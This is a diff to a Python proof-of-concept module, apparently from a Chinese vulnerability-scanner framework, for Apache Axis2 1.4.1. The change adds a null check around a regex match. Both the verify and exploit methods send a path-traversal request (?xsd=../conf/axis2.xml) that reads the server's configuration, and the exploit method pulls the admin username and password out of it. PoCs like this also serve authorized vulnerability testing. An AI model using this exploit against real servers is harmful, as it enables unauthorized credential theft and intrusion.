@@ -21,7 +21,7 @@ class Vuln(ABVuln):
     product_version = '1.4.1'  # 漏洞应用版本
 
 class Poc(ABPoc):
-    poc_id = '3c6b7330-5012-4a6c-bd45-d2f2f631abef' # 平台 POC 编号
+    poc_id = '51683b2e-0211-44bd-8412-4197e91a360e' # 平台 POC 编号
     author = '国光'  # POC编写者
     create_date = '2018-06-01' # POC创建时间
 
@@ -39,13 +39,14 @@ class Poc(ABPoc):
             res_html = res.read()
             if int(res_code) == 404: return
             m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res_html)
-            if m.group(1):
-                server_str = m.group(1)
-                read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
-                res = urllib2.urlopen(read_url, timeout=timeout)
-                res_html = res.read()
-                if 'axisconfig' in res_html:                  
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+            if m:
+                if m.group(1):
+                    server_str = m.group(1)
+                    read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
+                    res = urllib2.urlopen(read_url, timeout=timeout)
+                    res_html = res.read()
+                    if 'axisconfig' in res_html:                  
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
             
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
@@ -61,15 +62,16 @@ class Poc(ABPoc):
             res_html = res.read()
             if int(res_code) == 404: return
             m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res_html)
-            if m.group(1):
-                server_str = m.group(1)
-                read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
-                res = urllib2.urlopen(read_url, timeout=timeout)
-                res_html = res.read()
-                if 'axisconfig' in res_html:     
-                    user = re.search('<parameter name="userName">(.*?)</parameter>', res_html)
-                    password = re.search('<parameter name="password">(.*?)</parameter>', res_html)
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 密码为{password}'.format(target=self.target,name=self.vuln.name,username=user,password=password)) 
+            if m:
+                if m.group(1):
+                    server_str = m.group(1)
+                    read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
+                    res = urllib2.urlopen(read_url, timeout=timeout)
+                    res_html = res.read()
+                    if 'axisconfig' in res_html:     
+                        user = re.search('<parameter name="userName">(.*?)</parameter>', res_html)
+                        password = re.search('<parameter name="password">(.*?)</parameter>', res_html)
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 密码为{password}'.format(target=self.target,name=self.vuln.name,username=user,password=password)) 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
